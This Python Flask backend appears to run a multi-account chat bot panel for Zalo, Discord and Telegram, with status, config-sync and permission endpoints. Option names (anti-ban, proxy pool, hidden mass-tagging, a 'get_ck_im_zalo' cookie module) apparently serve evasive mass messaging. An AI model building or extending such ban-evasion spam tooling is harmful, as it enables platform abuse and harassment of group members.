@app.route("/api/status")
def api_status():
    """API Trạng Thái & Bảng Soi Lệnh Thời Gian Thực:"""
    t0 = time.perf_counter()
    now = time.time()
    with _STATUS_CACHE_LOCK:
        if _STATUS_SNAPSHOT_CACHE["payload"] is not None and (now - _STATUS_SNAPSHOT_CACHE["ts"] < 0.25):
            return jsonify(_STATUS_SNAPSHOT_CACHE["payload"])

    task_list = []
    with TASKS_RAM_LOCK:
        sorted_tasks = sorted(TASKS_RAM_STORE.values(), key=lambda x: x.get("started_at", 0), reverse=True)[:100]
        for t_obj in sorted_tasks:
            tid = t_obj.get("id", "")
            is_active = (tid in ACTIVE_TASKS and not ACTIVE_TASKS[tid]["stop"].is_set() and t_obj.get("status") == "running")
            meta = t_obj.get("meta") or {}
            live_opts = (ACTIVE_TASKS.get(tid) or {}).get("opts") or {}
            task_list.append({
                "id": tid,
                "mode": t_obj.get("type") or live_opts.get("mode") or "treo_nhay",
                "source": meta.get("source") or "web",
                "trigger_cmd": meta.get("trigger_cmd") or "",
                "acc_count": int(t_obj.get("acc_count") or 1),
                "by_acc": t_obj.get("by_acc") or {},
                "targets_count": meta.get("box_count") or len(meta.get("targets") or []),
                "sent": int(t_obj.get("sent", 0)),
                "fail": int(t_obj.get("fail", 0)),
                "status": "Đang chạy" if is_active else "Đã dừng",
                "delay": live_opts.get("delay", t_obj.get("delay", meta.get("delay", 1.0))),
            })

    acc_rows = get_all_accounts_from_ram()
    health_out = []
    for a in acc_rows:
        aid = a["id"]
        snap = HEALTH_MGR.get_snapshot(aid)
        lst = ACTIVE_LISTENERS.get(aid)
        ws_st = getattr(lst, "ws_status", "Đang trực chiến 24/7") if lst else "Tắt nhận lệnh"
        health_out.append({
            "id": aid,
            "platform": a.get("platform") or "zalo",
            "name": a.get("name") or f"Acc #{aid}",
            "masked_name": mask_account_name(a.get("name") or "Account"),
            "circuit": snap["circuit"],
            "rpm": snap["rpm"],
            "ok_total": snap["ok_total"],
            "risk_score": snap["risk_score"],
            "ws_status": sanitize_log_text(ws_st),
        })

    masked_logs = []
    for l in list(BOT_LOGS_RAM_DEQUE)[:45]:
        ts_val = float(l.get("created_at") or time.time())
        s_uid = str(l.get("sender_id") or "").strip()
        s_name = l.get("sender_name") or GLOBAL_USER_NAME_CACHE.get(s_uid) or (l.get("acc_name") if s_uid in ("0", "") else f"UID_{s_uid[-4:]}")
        masked_logs.append({
            "time_str": l.get("time_str") or time.strftime("%H:%M:%S", time.localtime(ts_val)),
            "platform": l.get("platform") or "CHAT",
            "acc_name": l.get("acc_name") or f"Acc #{l.get('acc_id', 0)}",
            "sender_id": s_uid,
            "sender_name": s_name,
            "thread_id": str(l.get("thread_id") or ""),
            "cmd_text": sanitize_log_text(l.get("cmd_text") or ""),
            "action_taken": sanitize_log_text(l.get("action_taken") or ""),
            "masked_thread": mask_sensitive_id(l.get("thread_id") or "", 5),
            "created_at": ts_val,
        })

    with SYSTEM_CFG_LOCK:
        rt_cfg_snap = dict(SYSTEM_RUNTIME_CONFIG)

    auth_users_list = list_authorized_users()
    for au in auth_users_list:
        au["time_str"] = time.strftime("%H:%M:%S %d/%m", time.localtime(float(au.get("added_at") or time.time())))

    tel = HEALTH_MGR.get_live_ping_telemetry()
    eng_ms = round((time.perf_counter() - t0) * 1000.0 + 0.15, 2)
    payload = {
        "tasks": task_list,
        "accounts_health": health_out,
        "cmd_logs": masked_logs,
        "authorized_users": auth_users_list,
        "runtime_config": rt_cfg_snap,
        "discord_firewall": DiscordFirewallEngine.get_firewall_snapshot(),
        "proxy_pool": ProxyPoolEngine.get_snapshot(),
        "ping_telemetry": {
            "engine_ms": eng_ms,
            "active_threads": threading.active_count(),
            "avg_send_ms": tel["avg_send_ms"],
            "jitter_ms": tel["jitter_ms"],
            "total_rpm": tel["total_rpm"],
            "total_healed": tel["total_healed"],
        }
    }
    with _STATUS_CACHE_LOCK:
        _STATUS_SNAPSHOT_CACHE["ts"] = time.time()
        _STATUS_SNAPSHOT_CACHE["payload"] = payload
    return jsonify(payload)

@app.route("/api/runtime_config/update", methods=["POST"])
def api_runtime_config_update():
    data = request.json or {}
    updates = {}
    if "icon_count" in data:
        ic_n = max(0, min(10, int(data.get("icon_count") or 0)))
        updates["icon_count"] = ic_n
        updates["use_emoji"] = (ic_n > 0)
    if "use_emoji" in data and "icon_count" not in data:
        updates["use_emoji"] = bool(data["use_emoji"])
    if "delay" in data:
        updates["delay"] = max(0.0, float(data.get("delay") or 0.0))
    if "color_mode" in data:
        updates["color_mode"] = str(data["color_mode"])
    if "fixed_color" in data:
        updates["fixed_color"] = str(data["fixed_color"])
    if "font_style" in data:
        fs = str(data["font_style"])
        updates["font_style"] = fs
        updates["is_heading"] = (fs in ("big_bold", "alternating_bold", "italic_bold", "underline_bold"))
    if "is_heading" in data and "font_style" not in data:
        updates["is_heading"] = bool(data["is_heading"])
    if "antiband" in data:
        updates["antiband"] = bool(data["antiband"])
    if "hide_tag_all" in data:
        updates["hide_tag_all"] = bool(data["hide_tag_all"])
    if "hide_tag_name" in data:
        updates["hide_tag_name"] = bool(data["hide_tag_name"])
    cnt = update_running_tasks_config(thread_id=None, **updates)
    log_system_command(0, "ALL_GROUPS", "Admin_Web", f"[WEB-SYNC] {json.dumps(updates, ensure_ascii=False)}", f"Đồng bộ cấu hình lên toàn bộ các nhóm ({cnt} tiến trình)", sender_name="Admin Web")
    with SYSTEM_CFG_LOCK:
        snap = dict(SYSTEM_RUNTIME_CONFIG)
    return jsonify({"ok": True, "updated_tasks": cnt, "runtime_config": snap, "message": "Đã áp dụng cấu hình lên toàn bộ các nhóm & đồng bộ Web!"})

@app.route("/api/permissions/add", methods=["POST"])
def api_permissions_add():
    data = request.json or {}
    uid = str(data.get("uid") or "").strip().lstrip("@")
    name = str(data.get("name") or "").strip().lstrip("@") or uid
    if not uid:
        return jsonify({"ok": False, "error": "Vui lòng nhập UID hoặc Tên người dùng cần cấp quyền (.cp)!"}), 400
    add_authorized_user(uid, name, acc_id=0)
    log_system_command(0, "Web_Permissions", "Admin_Web", f".cp @{name} ({uid})", f"Cấp quyền điều khiển (.cp) từ Web cho {name}", sender_name="Admin Web")
    return jsonify({"ok": True, "authorized_users": list_authorized_users(), "message": f"Đã cấp quyền (.cp) cho {name} ({uid})!"})

@app.route("/api/permissions/remove", methods=["POST"])
def api_permissions_remove():
    data = request.json or {}
    uid = str(data.get("uid") or "").strip()
    if uid in ("__all__", "all", "tatca"):
        remove_authorized_user("__all__")
        log_system_command(0, "Web_Permissions", "Admin_Web", ".xq all", "Thu hồi toàn bộ quyền điều khiển phụ (.cp)", sender_name="Admin Web")
        return jsonify({"ok": True, "authorized_users": [], "message": "Đã thu hồi sạch 100% danh sách quyền (.cp) — Chỉ Chủ Acc được dùng lệnh!"})
    remove_authorized_user(uid)
    log_system_command(0, "Web_Permissions", "Admin_Web", f".xq {uid}", f"Đã xóa quyền (.cp) của {uid}", sender_name="Admin Web")
    return jsonify({"ok": True, "authorized_users": list_authorized_users(), "message": f"Đã xóa quyền (.cp) của {uid}!"})

# TỰ ĐỘNG KHỞI CHẠY BOT TELEGRAM PHAN ANH KHÔI (RIKE) CÙNG WEB SERVER
_TELEGRAM_BOT_RUNNER = None

def ensure_telegram_bot_started():
    global _TELEGRAM_BOT_RUNNER
    if _TELEGRAM_BOT_RUNNER is not None:
        return
    try:
        from get_ck_im_zalo import start_background_telegram_bot
        _TELEGRAM_BOT_RUNNER = start_background_telegram_bot(TELEGRAM_BOT_TOKEN)
    except Exception:
        pass

if os.environ.get("DISABLE_TELEGRAM_BOT", "0") != "1":
    threading.Thread(target=ensure_telegram_bot_started, daemon=True).start()

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, threaded=True)
